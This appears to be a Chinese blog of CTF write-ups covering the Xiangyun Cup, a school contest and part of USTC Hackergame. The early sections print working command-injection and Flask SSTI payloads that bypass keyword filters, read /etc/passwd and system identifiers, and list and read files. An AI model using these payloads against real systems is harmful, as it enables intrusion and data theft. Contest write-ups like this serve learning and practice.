/usr/lib/perl/5.18.2/bits/waitflags.ph /etc/.findflag /etc/.findflag/flag.txt /proc/sys/kernel/sched_domain/cpu0/domain0/flags /proc/sys/kernel/sched_domain/cpu1/domain0/flags /proc/kpageflags /etc/.findflag/flag.txt便是flag所在位置了，先记下来\n既然对flag过滤了，那么接下来cat也需要使用base64进行构造\n执行命令为\n1 ca\\t /etc/.findf\\lag/f\\lag.txt base64加密得Y2FcdCAvZXRjLy5maW5kZlxsYWcvZlxsYWcudHh0\n最终payload为\n1 127.0.0.1|echo%09Y2FcdCAvZXRjLy5maW5kZlxsYWcvZlxsYWcudHh0|base64%09-d|bas\\h 取得flag\nResult:flag{9f1a16d4-5f5c-4104-8e18-6c73621531ef}\nflaskbot 这是一道SSTI题\nSSTI: Server-Side Template Injection\n试着输入username: iyume\n试着输入num: 777\n会出来一个 html 纯文本页面\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 1:500000000.0 is too large 2:250000000.0 is too large 3:125000000.0 is too large 4:62500000.0 is too large 5:31250000.0 is too large 6:15625000.0 is too large 7:7812500.0 is too large 8:3906250.0 is too large 9:1953125.0 is too large 10:976562.5 is too large 11:488281.25 is too large 12:244140.625 is too large 13:122070.3125 is too large 14:61035.15625 is too large 15:30517.578125 is too large 16:15258.7890625 is too large 17:7629.39453125 is too large 18:3814.69726562 is too large 19:1907.34863281 is too large 20:953.674316406 is too large 21:476.837158203 is too small 22:715.255737305 is too small 23:834.465026855 is too large 24:774.86038208 is too small 25:804.662704468 is too large 26:789.761543274 is too large 27:782.310962677 is too large 28:778.585672379 is too large 29:776.723027229 is too small 30:777.654349804 is too large 31:777.188688517 is too large 32:776.955857873 is too small 33:777.072273195 is too large 34:777.014065534 is too large 35:776.984961703 is too small 36:776.999513619 is too small 37:777.006789576 is too large 38:777.003151597 is too large 39:777.001332608 is too large 40:777.000423113 is too large 41:776.999968366 is too small 42:777.00019574 is too large 43:777.000082053 is too large 44:777.000025209 is too large 45:776.999996788 is too small 45:776.999996788 is close enough I win 二分法逼近，数字肯定无法胜利，寻找别的方法\n首先是信息搜集，利用debugger的栈查看上下文，尝试input num type error、404、username error，分别出现三个报错页面，如下图\ninput num type error\n信息点：对输入的username进行了base64加密并储存在cookie:user内，然后访问的时候会取得cookie:user内的值进行解密并储存在name这个内部变量\n404\n信息点：有一个render_template_string()，极大可能是注入点，它的传参是使用%s获取的，因此可以注入模板，guessNum()应该就是猜数字的函数，传参为num和name，name就是在上一个信息点得知的username，但是显然他并没有打印出任何与name相关的东西，比如iyume vs bot之类的，有可能是在人胜利时才会输出\nusername error\n信息点：有一个render_template()，但这个调用模板的函数并不像render_template_string()，它的传参是变量取值的形式，任何字符都无法注入，硬要说注入的话只可能是第一个参数（但一般没有人会去让用户控制网页名吧），因此这只能当作一个无用信息点\n根据第二点，试着把cookie:user改成比如e3syKjd9fQ==(base64decode={{2*7}})\n因为是render_template()输出的这个页面，payload的回显合乎情理\n另寻途径\nPython 中有一种空值类型(float)NaN，可以通过 float('nan') 得到\nfloat('inf') 得到无限大，负的则为无限小\nNaN 与任何数进行任何比较都会返回 false，那试着在数字框输入 NaN\n1 2 3 4 5 1:500000000.0 is too small 2:750000000.0 is too small ... 51:1000000000.0 is too small Wow! Damn you hacker! You will never win. 看来这里是我赢了，但是可能payload中有特殊字符被过滤了\n把cookie:user的值换成e3syfX0=(decode={{2}})\n1 Wow! 2 win. 输出了我的胜利，并且\\{\\{2\\}\\}成功被渲染成了2\n至此，SSTI注入点确定\n接下来有两种思路\n直接寻找flag并读取 收集系统信息生成pin码hack shell Pin 码 Getshell 先讲讲第二种，因为我没能成功\n生成pin所需系统信息（算法不贴了）\nusername modname app.__class__.\u0026rsquo;__name__' app_path eth0_mac machine-id 在报错页面已经取得了信息2、3、4\n基本构造\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[40](\u0026#39;/etc/passwd\u0026#39;).read()}} 成功得到回显\n1 Wow! root:x:0:0:root:/root:/bin/ash bin:x:1......spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin win. 信息1应该就是guest了\n接着构造\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[40](\u0026#39;/sys/class/net/eth0/address\u0026#39;).read()}} 得到回显00:16:3e:03:ee:c0\n在python shell执行print(0x00163e03eec0)即可获取信息5\n接着构造\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[40](\u0026#39;/etc/machine-id\u0026#39;).read()}} 返回debugger提示No Such file or dir，又试了试/var/lib/dbus/machine-id，还是没有此文件，后来去列了一下目录，发现根本没有这个文件，看来是被动了手脚\u0026hellip;以 失败 告终\n直接寻找 flag 构造\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\u0026#39;os\u0026#39;].listdir(\u0026#39;/\u0026#39;)}} 被过滤了\n排查后发现被过滤的字符是os，那就替换成'o'+'s'\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;].listdir(\u0026#39;/\u0026#39;)}} 成功得到回显\n1 [\u0026#39;proc\u0026#39;, \u0026#39;home\u0026#39;, \u0026#39;mnt\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;srv\u0026#39;, \u0026#39;usr\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;var\u0026#39;, \u0026#39;opt\u0026#39;, \u0026#39;bin\u0026#39;, \u0026#39;sbin\u0026#39;, \u0026#39;etc\u0026#39;, \u0026#39;run\u0026#39;, \u0026#39;media\u0026#39;, \u0026#39;tmp\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;lib\u0026#39;, \u0026#39;super_secret_flag.txt\u0026#39;, \u0026#39;app\u0026#39;] 显然super_secret_flag.txt就是 target 了\n但它也对flag进行了过滤\n那么构造如下payload\n1 {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[40](\u0026#39;/sup\u0026#39;+\u0026#39;er_se\u0026#39;+\u0026#39;cret_fl\u0026#39;+\u0026#39;ag.txt\u0026#39;).read()}} 得到回显\n1 Wow! flag{4e713984-b085-412d-8b8b-c95bbf4f44b9} win. 成功取得flag\n注意点 模板对system关键字进行了过滤，因此继承类''.__class__.__mro__[2].__subclasses__()[71]下调用os.system是没用的，目前没有绕过方案 总结 祥云杯的水份还是挺高的，题目共有 31 道\nMisc 6 Crypto 6 PWN 6 Reverse 7 Web 6 除了签到题，基本每道题都非常难，也非常有意思（\nMisc 有一道题目叫做进制反转，我的基本思路是CRC 修复然后解压文件进行二进制按位取反？正拿着python提取了16进制数据，又听大佬说硬解 au 原始数据导入倒放 x.5 然后搜歌词，我就停手了（菜死了\n比赛过程还学了一下RSA加密原理，虽然最后还是不会解题（\n对了，这个比赛的积分制度是一血（没有额外奖励）、以及动态积分模式（根据解出题目的队伍数减少相应的分值）\n关于组队，因为我也没加入协会（还没开始纳新），然后就个人参赛了。此外我们学校我所知的还有很多队伍，第一的那队解题数量11，排名好像是省内高校14，但省内高校出赛名额只有3个，所以我们学校也没有队伍晋级线下赛。\n至于我的排名，解题数量4，积分179，我只知道是校内第5，省内高校估计排到80多的样子\n校内赛的预赛已经过了，决赛形式是CTF+AWD，还没开始，因此做保留\n还想到别的什么再作补充\n校赛 比赛时间：2020-12-06 9:00-11:30, 14:00-15:30\n比赛形式：CTF + AWD\n其实只有 CTF 可以讲，AWD 完全不会玩。\n而且题目名称很多都忘了\u0026hellip;就随便写了\nNot only base64 7JJ3vECw1FBbqNxmQrcrd8toHvUiY\n听题目名字就知道这是 base 系的加解密\n目测没什么特征，一个一个试，最终是用 base58 解出来了\n1 flag{n0t_on1y_base64} base58 很多人可能不知道这是什么，因为在日常生活确实不常见，但并不代表它用处不大，实际上比特币的钱包地址和私钥都是 base58 加密生成的。\nWeb 第二题 就是一道基础题，直接 hackbar 都可以解决，没有环境不讲了\nWeb 第三题 有时候阅读文档是一件很重要的事情\n由于出题人的锅，这题端口号给错了，导致我以为这是一道 0day，搞了好半天。后来比赛结束了直接就去问了出题人，他也是才发现端口给错了。不过后来用正确的端口号为我们讲解了一下题目。\n没有环境，我就随便说说算了。\n网页中提示我们去看文档，并且给了个 GET 参数，值是一个函数。提交这个参数会调用对应的函数。那就需要一个可以返回所有函数的函数，这时候去读文档，可以发现 get_defined_functions 这个函数可以满足需求，于是直接 GET，只返回了一个函数，就是获取 flag 的函数，再调用一次就拿到了 flag\nMisc 1 给了个 jpg 图片，查看属性-详细信息，描述里就写着 flag\nMisc 2 给了个 jpg 图片，直接点开发现是不支持的格式，直接改后缀 zip，里面有 50 张二维码图片，扫码试试得不到 flag，但是发现了一张体积异常的图片，解压出来查看属性-详细信息，得到 base64 字符串，解密得 flag\nMisc 3 / 4 这两题异曲同工，都是 zip 伪加密、高级伪加密，binwalk 一梭子解决。\n好吧，其实我不是这么解的。我的解法很蠢。\n用 010 Editor 打开 zip，把 Misc 3 的目录加密位、文件加密位改掉就可以直接打开了。把 Misc 4 的伪加密也全部去掉，但是并不能打开，直接手动提取 16 进制，把第二个文件 Tips.txt 解压了出来可以直接打开，但是第一个文件 flag.txt 还是有加密无法打开，后来发现是我漏了一处伪加密没有去掉。\nTips.txt 写了字频统计，那就对 flag.txt 进行字频统计呗。这里其实最好使用自己的脚本，因为在线的大多不支持长字符串。\nMisc 5 同样也是伪加密，全部去掉解压，可以发现 flag.txt 里面写了一些描述，我记得有86、QQMusic、给我一杯牛奶之类的，是一道社工题，打开 QQ 音乐搜就是了，一般就是第 86 号里写的那个评论。\nReverse 想什么呢。我不会逆向，连 IDA 都没装。\nAWD 为了准备 AWD 比赛，我甚至自己搭建了一个环境分享给学长一起来玩。\n地址: https://github.com/mo-xiaoxi/AWD_CTF_Platform\n实际到比赛的时候，我也挺傻的，我在比赛结束前 10min 才发现每队的 root 账密就在大屏幕上写着，因为整个比赛就 1h30min，因为我太傻就基本都在划水\u0026hellip;只能看着别的队伍拿分，还在想对方到底是怎么通过那个 Web 服务拿到 shell 的\nWeb 服务有个注入漏洞，进入管理页面可以发现很明显的文件包含漏洞。不过发现的时候，已经比赛快结束了。\n以及，比赛服务器太弱鸡了，全场都没怎么快过。\n","date":"2020-11-22T21:17:00+08:00","image":"https://i.loli.net/2020/11/23/ASHrxb2RhTsZtGy.jpg","permalink":"https://blog.tinyume.com/2020/xiangyun-school-ctf-writeup/","title":"祥云杯 校赛 Write-up"},{"content":"Preface 此前从来没参加过 CTF、信安赛之类的，真要说类似的就是解一些过年时我所关注的各位大佬发的红包谜题了。\n反正就一直对 CTF 抱有很大的念想。虽说 USTC 这个只有个人赛，不过早就听说其难度老少皆宜了，大学后可支配时间也多了，作为我的第一次比赛正好。\n大佬们就没必要看了（\nQ List 签到 猫咪问答++ 2048 一闪而过的 Flag 从零开始的记账工具人 超简单的世界模拟器(2) 从零开始的火星文生活 自复读的复读机(2) 233 同学的字符串工具 233 同学的 Docker 从零开始的 HTTP 链接 来自一教的图片 超简陋的 OpenGL 小程序 生活在博弈树上(2) 来自未来的信笺 狗狗银行 超基础的数理计算器 永不溢出的计算器 普通的身份认证器 超精巧的数字论证器 超自动的开箱模拟器 室友的加密硬盘 超简易的网盘服务器 超安全的代理服务器(2) 证验码 动态链接库检查器 超精准的宇宙射线模拟器 超迷你的挖矿模拟器 Flag 计算机 中间人(2) 不经意传输(2) 签到 选手要多少个 flag，我就给多少个 flag，绿色背景，红色加粗，显眼的位置，标准的格式，这都不叫送，那还有什么叫做送。\n点击 「打开/下载题目」 按钮，打开 flag 提取器，获取第一个 flag 吧！\n直接滑动是滑不到1的\n让我们打开控制台看看\n定位到滑动块的元素，可以发现这个step属性值很奇怪，把它给改成1、0.5、0.1之类的值再滑动一下，就发现可以定位到 1 了，再点提取\n第一个 Flag 就得到了\n猫咪问答++ 这题其实我是留到第二天才做的\n点此查看题目截图\n此题考察搜索引擎的使用能力。\n先说说答案吧，从第一问到第五问分别是12、256、9、9、17098。\n我当时没能查到第一题和第二题，第四题一开始用错成了谷歌全景，后来被朋友指点才发现要用百度全景。\n这是当时用 Python 写的遍历\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.common.exceptions import NoSuchElementException import time import requests bs = webdriver.Firefox() bs.get(\u0026#34;http://202.38.93.111:10001/?token=1294%3AMEYCIQDGGgsw4ZIS8VYoonINuZNHwWagU8HonbAS8xibpRsb8QIhAMtC8zWSEbqwPOgmgaix0hzT%2Bho30JdIC8fp%2B1Uojwdg\u0026#34;) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[1]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[1]/div/div[2]/input\u0026#34;).send_keys(str(0)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[2]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[2]/div/div[2]/input\u0026#34;).send_keys(str(0)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[3]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[3]/div/div[2]/input\u0026#34;).send_keys(str(0)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[4]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[4]/div/div[2]/input\u0026#34;).send_keys(str(0)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[5]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[5]/div/div[2]/input\u0026#34;).send_keys(str(0)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/input\u0026#34;).click() time.sleep(1) # 用眼睛看吧，不想写字符串识别了 for i in range(12, 23): bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[2]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[2]/div/div[2]/input\u0026#34;).send_keys(str(i)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[3]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[3]/div/div[2]/input\u0026#34;).send_keys(str(256)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[4]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[4]/div/div[2]/input\u0026#34;).send_keys(str(9)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[5]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[5]/div/div[2]/input\u0026#34;).send_keys(str(9)) time.sleep(0.2) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[6]/div/div[2]/input\u0026#34;).click() bs.find_element_by_xpath(\u0026#34;/html/body/form/div/div[6]/div/div[2]/input\u0026#34;).send_keys(str(17098)) time.sleep(0.2) print(i) bs.find_element_by_xpath(\u0026#34;/html/body/form/div/input\u0026#34;).click() time.sleep(1) # keyboard interrupt 后第一问答案为 12 写的很丑，但既然用到了，那就写进 Write-up\n最终得到第二题的 Flag\n2048 要实现 FLXG，你需要过人的智慧，顽强的意志，和命运的眷属。只有在 2048 的世界里证明自己拥有这些宝贵的品质，实现「大成功」，你才有资格扛起 FLXG 的大旗。\n一个并不寻常的 2048\n我一开始真的就玩了起来\u0026hellip;然后玩到炸毁金矿我心态就跟着炸了，这 TM 怎么还没结束啊（\n我当时也挺呆的，就写了个脚本让它自己跑\u0026hellip;emm\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from selenium import webdriver from selenium.webdriver.common.keys import Keys from selenium.common.exceptions import NoSuchElementException import time import requests # 打开firefox，并访问2048游戏界面 bs = webdriver.Firefox() bs.get(\u0026#34;http://202.38.93.111:10005/\u0026#34;) bs.find_element_by_name(\u0026#34;token\u0026#34;).click() bs.find_element_by_name(\u0026#34;token\u0026#34;).send_keys(\u0026#34;1294:MEYCIQDGGgsw4ZIS8VYoonINuZNHwWagU8HonbAS8xibpRsb8QIhAMtC8zWSEbqwPOgmgaix0hzT+ho30JdIC8fp+1Uojwdg\u0026#34;) bs.find_element_by_xpath(\u0026#34;/html/body/form/input[2]\u0026#34;).click() html = bs.find_element_by_tag_name(\u0026#39;html\u0026#39;) while True: # 每四个方向操作后判断游戏是否结束 print(\u0026#39;send up,right,down,left\u0026#39;) html.send_keys(Keys.UP) time.sleep(0.2) html.send_keys(Keys.RIGHT) time.sleep(0.2) html.send_keys(Keys.DOWN) time.sleep(0.2) html.send_keys(Keys.LEFT) time.sleep(0.2) game_over = bs.find_element_by_xpath(\u0026#34;/html/body/div/div[3]/div/p\u0026#34;) if game_over.text == \u0026#39;FLXG 永不放弃！\u0026#39;: #score = bs.find_element_by_class_name(\u0026#39;score-container\u0026#39;) #当前得分 #print(\u0026#39;game over, score is %s\u0026#39; % score.text) #print(\u0026#39;wait 3 seconds, try again\u0026#39;) #time.sleep(3) # 游戏结束后，等待3秒，自动点击try again重新开始 print(\u0026#34;重新开始\u0026#34;) try_again = bs.find_element_by_class_name(\u0026#39;retry-button\u0026#39;) try_again.click() 然后丢到后台没理它，开始做下一题了\nTwo thousand years later\u0026hellip;\n当我翻到后台——\nWTF？跑到了 5436 还没结果时我就知道我方法错了\nView-source 走起\n诶这不是赤裸裸的提示嘛\n点进去看看\n看到这里我就知道脚本永远跑不出来了\n再往下翻翻\n原来是 js 跳转，那我们直接把url拿出来就行了，可这个url有点奇怪，里面有个函数，拿到控制台跑一下试试\n成功获取了真正的url！输入网址回车\n得到第三题的 Flag\n一闪而过的 Flag flag 来了，可是我什么也看不见！\n先下载文件\n直接双击运行只会看到黑框出现一下就消失了\n第一种方法：直接快速截屏，肉眼识别\n第二种方法：在命令行运行文件\n这里采用第二种\n复制\n得到第四题的 Flag\n从零开始的记账工具人 这不是很简单吗？电子表格里面一拖动就算出来了\n考察搜索引擎使用以及小脚本的编写\n先把题目下载下来\n先看看bills.xlsx，里面是 1000 行人民币大写金额，那么题目要求就是全部转换小写求和了\n这题我一开始就想到了Python，又是我最熟悉的大数据分析，于是直接把bills.xlsx上传到了树莓派的内网notebook服务器上\n首先需要找一个人民币大写转小写的函数做轮子，再用数量乘金额并求和\n代码如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import numpy as np import pandas as pd import re def aoligeiganle(amount): chinese_num = {\u0026#39;零\u0026#39;: 0, \u0026#39;壹\u0026#39;: 1, \u0026#39;贰\u0026#39;: 2, \u0026#39;叁\u0026#39;: 3, \u0026#39;肆\u0026#39;: 4, \u0026#39;伍\u0026#39;: 5, \u0026#39;陆\u0026#39;: 6, \u0026#39;柒\u0026#39;: 7, \u0026#39;捌\u0026#39;: 8, \u0026#39;玖\u0026#39;: 9} chinese_amount = {\u0026#39;分\u0026#39;: 0.01, \u0026#39;角\u0026#39;: 0.1, \u0026#39;元\u0026#39;: 1, \u0026#39;拾\u0026#39;: 10, \u0026#39;佰\u0026#39;: 100, \u0026#39;仟\u0026#39;: 1000, \u0026#39;圆\u0026#39;: 1} amount_float = 0 if \u0026#39;亿\u0026#39; in amount: yi = re.match(r\u0026#39;(.+)亿.*\u0026#39;, amount).group(1) amount_yi = 0 for i in chinese_amount: if i in yi: amount_yi += chinese_num[yi[yi.index(i) - 1]] * chinese_amount[i] if yi[-1] in chinese_num.keys(): amount_yi += chinese_num[yi[-1]] amount_float += amount_yi * 100000000 amount = re.sub(r\u0026#39;.+亿\u0026#39;, \u0026#39;\u0026#39;, amount, count=1) if \u0026#39;万\u0026#39; in amount: wan = re.match(r\u0026#39;(.+)万.*\u0026#39;, amount).group(1) amount_wan = 0 for i in chinese_amount: if i in wan: amount_wan += chinese_num[wan[wan.index(i) - 1]] * chinese_amount[i] if wan[-1] in chinese_num.keys(): amount_wan += chinese_num[wan[-1]] amount_float += amount_wan * 10000 amount = re.sub(r\u0026#39;.+万\u0026#39;, \u0026#39;\u0026#39;, amount, count=1) amount_yuan = 0 for i in chinese_amount: if i in amount: if amount[amount.index(i) - 1] in chinese_num.keys(): amount_yuan += chinese_num[amount[amount.index(i) - 1]] * chinese_amount[i] amount_float += amount_yuan return amount_float df = pd.read_excel(\u0026#39;./bills.xlsx\u0026#39;, \u0026#39;Sheet1\u0026#39;) raw_price_list = [] price_list = [] num_list = np.array(df[\u0026#39;数量\u0026#39;]) for i in range(0,1000): raw_price_list.append(aoligeiganle(df[\u0026#39;单价\u0026#39;][i])) raw_price_list = np.array(raw_price_list) sum(np.multiply(num_list, raw_price_list)) 这里其实麻烦也挺多的，很后面才发现找来的这个函数不完整，没有对拾开头汉字金额的进行处理\n于是在函数尾部加上以下代码\n1 2 if \u0026#39;拾\u0026#39; in amount[0]: amount_float += 10 最终运算结果是这样的\n答案12422.75，这就是第五题的 Flag 值了\n得到第五题 Flag\n自复读的复读机 能够复读其他程序输出的程序只是普通的复读机。\n顶尖的复读机还应该能复读出自己的源代码。\n什么是国际复读机啊（战术后仰）\n这题应该是我耗时最长的题目了，不过题目本身还是非常有意思的\n先来读题\n你现在需要编写两个只有一行 Python 代码的顶尖复读机：\n满足两个条件分别对应了两个 flag\n其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）\n另一个是输出代码本身的 sha256 哈希值，十六进制小写\n遇事不懂，首先谷歌\nQuine 是什么？\nA quine is a computer program which takes no input and produces a copy of its own source code as its only output. The standard terms for these programs in the computability theory and computer science literature are \u0026ldquo;self-replicating programs\u0026rdquo;, \u0026ldquo;self-reproducing programs\u0026rdquo;, and \u0026ldquo;self-copying programs\u0026rdquo;.\n\u0026mdash;-Wiki\n简而言之就是打印出代码本身\n看来 Quine 就是我们所需要的了\n找到以下文章供参考\nhttp://littledva.cn/article-24/\n还是打开我最熟悉的notebook，一步步来解析题目吧！\n1 a=chr(39);c=\u0026#34;+a)*2+c)\u0026#34;;print((\u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)\u0026#34;;print((\u0026#39;+a)*2+c) 先把范例拿进去试试，的确输出了代码本身\n然后解析一下这段代码的原理\n代码只有一个print函数\n代码可以拆成以下三部分\na=chr(39);c=\u0026quot;+a)*2+c)\u0026quot;;print(('\na=chr(39);c=\u0026quot;+a)*2+c)\u0026quot;;print(('\n+a)*2+c)\nprint的层级\n\u0026lsquo;a=chr(39);c=\u0026quot;+a)*2+c)\u0026quot;;print((\u0026rsquo;\n(\u0026lsquo;1\u0026rsquo;+a)*2\n(\u0026lsquo;1\u0026rsquo;+a)*2+c\n仔细看看就可以明白代码自复读的原理了\n以上不详细讲了，进入解题吧 第一题：输出代码本身的逆序（即所有字符从后向前依次输出）\n我们知道Python字符串逆序有以下两种方法（其余不介绍）：\nstr[::-1]\n\u0026lsquo;\u0026rsquo;.join(reversed(str))\n显然第一个看起来简单好写，从第一个入手\n1 a=chr(39);c=\u0026#34;+a)*2+c)\u0026#34;;print((\u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)\u0026#34;;print((\u0026#39;+a)*2+c) 我们要输出逆序，那就直接在print最后加个[::-1]试试呗\n1 2 3 a=chr(39);c=\u0026#34;+a)*2+c)\u0026#34;;print(((\u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)\u0026#34;;print((\u0026#39;+a)*2+c)[::-1]) # 输出 )c+2*)a+\u0026#39;((tnirp;\u0026#34;)c+2*)a+\u0026#34;=c;)93(rhc=a\u0026#39;((tnirp;\u0026#34;)c+2*)a+\u0026#34;=c;)93(rhc=a # 正序 a=chr(39);c=\u0026#34;+a)*2+c)\u0026#34;;print((\u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)\u0026#34;;print((\u0026#39;+a)*2+c) 少了[::-1]和一对括号，那就加到c里面去\n1 2 3 a=chr(39);c=\u0026#34;+a)*2+c)[::-1])\u0026#34;;print(((\u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)[::-1])\u0026#34;;print(((\u0026#39;+a)*2+c)[::-1]) # 输出 )]1-::[)c+2*)a+\u0026#39;(((tnirp;\u0026#34;)]1-::[)c+2*)a+\u0026#34;=c;)93(rhc=a\u0026#39;(((tnirp;\u0026#34;)]1-::[)c+2*)a+\u0026#34;=c;)93(rhc=a # 正序 a=chr(39);c=\u0026#34;+a)*2+c)[::-1])\u0026#34;;print(((\u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)[::-1])\u0026#34;;print(((\u0026#39;+a)*2+c)[::-1]) 完成！它输出了自身的倒序！\n可这还不够，我们把它丢到web executor试试\n1 2 3 4 5 Your code is: \u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)[::-1])\u0026#34;;print(((\\\u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)[::-1])\u0026#34;;print(((\\\u0026#39;+a)*2+c)[::-1])\u0026#39; Output of your code is: \u0026#39;)]1-::[)c+2*)a+\\\u0026#39;(((tnirp;\u0026#34;)]1-::[)c+2*)a+\u0026#34;=c;)93(rhc=a\\\u0026#39;(((tnirp;\u0026#34;)]1-::[)c+2*)a+\u0026#34;=c;)93(rhc=a\\n\u0026#39; 它发生了什么？多了个\\n！\n其实我看到这里犯了个迷糊，既然你输出\\n那我也输出一个\\n不就是了吗（大声）不\n然后有了以下代码\n1 a=chr(39);b=chr(92)+\u0026#34;n\u0026#34;;c=\u0026#34;+a)*2+c)[::-1]+b)\u0026#34;;print(((\u0026#39;a=chr(39);b=chr(92)+\u0026#34;n\u0026#34;;c=\u0026#34;+a)*2+c)[::-1]+b)\u0026#34;;print(((\u0026#39;+a)*2+c)[::-1]+b) 然后\u0026hellip;\n1 2 3 4 5 Your code is: \u0026#39;a=chr(39);b=chr(92)+\u0026#34;n\u0026#34;;c=\u0026#34;+a)*2+c)[::-1]+b)\u0026#34;;print(((\\\u0026#39;a=chr(39);b=chr(92)+\u0026#34;n\u0026#34;;c=\u0026#34;+a)*2+c)[::-1]+b)\u0026#34;;print(((\\\u0026#39;+a)*2+c)[::-1]+b)\u0026#39; Output of your code is: \u0026#39;)b+]1-::[)c+2*)a+\\\u0026#39;(((tnirp;\u0026#34;)b+]1-::[)c+2*)a+\u0026#34;=c;\u0026#34;n\u0026#34;+)29(rhc=b;)93(rhc=a\\\u0026#39;(((tnirp;\u0026#34;)b+]1-::[)c+2*)a+\u0026#34;=c;\u0026#34;n\u0026#34;+)29(rhc=b;)93(rhc=a\\\\n\\n\u0026#39; 我就忍不住笑了 hhh\n后来我才想到是print自带的换行啊，那我加个end=''不就行了吗\n于是正确代码如下——\n1 a=chr(39);c=\u0026#34;+a)*2+c)[::-1],end=\u0026#34;+a*2+\u0026#34;)\u0026#34;;print(((\u0026#39;a=chr(39);c=\u0026#34;+a)*2+c)[::-1],end=\u0026#34;+a*2+\u0026#34;)\u0026#34;;print(((\u0026#39;+a)*2+c)[::-1],end=\u0026#39;\u0026#39;) 得到此题第一个 Flag\n第二题：输出代码本身的 sha256 哈希值，十六进制小写\n此题难度高一点\n先贴出源代码\n1 import hashlib;a=chr(39);c=\u0026#34;+a)*2+c+a+\u0026#34;;d=a+\u0026#34;+d).encode()).hexdigest(),end=\u0026#34;+a*2+\u0026#34;)\u0026#34;;print(hashlib.sha256(((\u0026#39;import hashlib;a=chr(39);c=\u0026#34;+a)*2+c+a+\u0026#34;;d=a+\u0026#34;+d).encode()).hexdigest(),end=\u0026#34;+a*2+\u0026#34;)\u0026#34;;print(hashlib.sha256(((\u0026#39;+a)*2+c+a+\u0026#39;.encode()).hexdigest())\u0026#39;+d).encode()).hexdigest(),end=\u0026#39;\u0026#39;) 就随便讲讲思路吧，前面其实挺好构造的，主要是后面那一块\n这个构造就是靠眼力，哪里多了个单引号，哪里少了个括号，添添补补就完事了。\n构造d的原理和构造c的原理是一样的\n构造原型是这样的——\n1 import hashlib;print(hashlib.sha256(\u0026#34;codeself\u0026#34;.encode()).hexdigest()) codeself就是输出这个代码本身了\n在进行构造时，可以把codeself写成如下形式方便参考\n1 2 3 4 a=chr(39) c=\u0026#34;+a)*2+c+a+\u0026#34; d=a+\u0026#34;+d).encode()).hexdigest(),end=\u0026#34;+a*2+\u0026#34;)\u0026#34;; print((\u0026#39;import hashlib;a=chr(39);c=\u0026#34;+a)*2+c+a+\u0026#34;;d=a+\u0026#34;+d).encode()).hexdigest(),end=\u0026#34;+a*2+\u0026#34;)\u0026#34;;print(hashlib.sha256(((\u0026#39;+a)*2+c+a+\u0026#39;.encode()).hexdigest())\u0026#39;+d,end=\u0026#39;\u0026#39;) 一般来说，只要这里输出和你的源代码一样，那这个题目就完成了\n然后放到web executor\n得到此题第二个 Flag\n小小的题外话 当时做这题时周末已经结束了，于是我用思修课加一节晚自习，靠手写把这两题硬生生写出来的，用了整整四张草稿纸。\n233 同学的 Docker 既然已经删掉了，应该不会被人找出来吧？\n我本人并未使用过Docker，因此解这题并没有用到什么特别高级的技巧或者命令\n先把镜像拉下来\n1 sudo docker pull 